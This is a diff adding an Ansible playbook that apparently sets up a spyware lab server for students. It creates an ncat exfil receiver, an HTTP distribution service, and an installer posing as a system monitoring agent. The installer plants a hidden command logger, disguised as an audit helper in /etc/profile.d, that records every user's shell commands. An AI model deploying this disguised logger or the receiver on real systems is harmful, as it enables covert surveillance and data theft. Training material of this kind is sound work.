@@ -1,0 +1,115 @@
+---
+- name: Add spy operator user
+  user:
+    name: '{{ username }}'
+    password: '{{ password | password_hash("sha512") }}'
+    shell: '/bin/bash'
+    groups: sudo
+    append: yes
+
+- name: Add host aliases
+  lineinfile:
+    path: '/etc/hosts'
+    line: "{{ item.ip }} {{ item.name }}"
+    state: present
+  loop: "{{ hosts_entries }}"
+
+- name: Install ncat and python3
+  apt:
+    name:
+      - ncat
+      - python3
+    state: present
+    update_cache: yes
+
+- name: Create C2 log directory
+  file:
+    path: /var/log/spyware-c2
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+
+- name: Create exfil receiver service (logs incoming dossier data)
+  copy:
+    dest: /etc/systemd/system/spyware-exfil-rcv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Spyware exfil data receiver
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ exfil_port }} >> /var/log/spyware-c2/exfil.log 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create installer distribution service (HTTP on port 8888)
+  copy:
+    dest: /etc/systemd/system/spyware-dist.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Internal software distribution server
+      After=network.target
+
+      [Service]
+      Type=simple
+      WorkingDirectory=/var/www/agents
+      ExecStart=/usr/bin/python3 -m http.server 8888
+      Restart=always
+      RestartSec=3
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create agent distribution directory
+  file:
+    path: /var/www/agents
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Place the original installer on the spy server (retrievable by students)
+  copy:
+    dest: /var/www/agents/sys-agent-install.sh
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # sys-agent v2.3 — System Performance Monitoring Agent
+      # Internal deployment script — authorised hosts only
+      set -e
+      echo "[sys-agent] Installing system monitoring agent..."
+      install -m 0755 -d /usr/local/lib/.monitor
+      install -m 0755 -d /var/lib/.monitor
+
+      # Install profile hook (disguised as audit helper)
+      cat > /etc/profile.d/sys-audit.sh <<'PROFILEEOF'
+      # System audit helper — managed by sys-agent
+      export PROMPT_COMMAND='echo "$(date -Is) $(whoami)@$(hostname) CMD: $(history 1 | sed "s/^[ ]*[0-9]*[ ]*//")" >> /var/lib/.monitor/keylog.log 2>/dev/null'
+      PROFILEEOF
+      chmod 0644 /etc/profile.d/sys-audit.sh
+
+      echo "[sys-agent] Agent installed. System monitoring active."
+
+- name: Enable and start exfil receiver and distribution services
+  systemd:
+    name: "{{ item }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
+  loop:
+    - spyware-exfil-rcv.service
+    - spyware-dist.service
